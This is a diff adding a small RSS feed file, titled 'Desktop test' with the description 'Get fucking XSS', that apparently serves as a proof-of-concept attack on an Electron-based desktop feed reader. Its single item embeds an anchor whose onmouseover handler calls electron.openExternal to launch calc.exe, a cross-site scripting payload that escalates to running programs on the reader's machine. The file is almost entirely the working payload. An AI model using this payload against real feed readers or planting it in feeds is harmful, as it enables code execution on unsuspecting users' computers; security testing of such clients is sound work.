@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+
+<channel>
+  <title>Desktop test</title>
+  <link>https://www.w3schools.com</link>
+  <description>Get fucking XSS</description>
+  <item>
+    <title>test</title>
+    <link>localhost</link>
+    <description>
+      <a onmouseover="electron.openExternal('C:\\Windows\\System32\\calc.exe')">hello</a>
+    </description>
+  </item>
+</channel>
+
+</rss> 
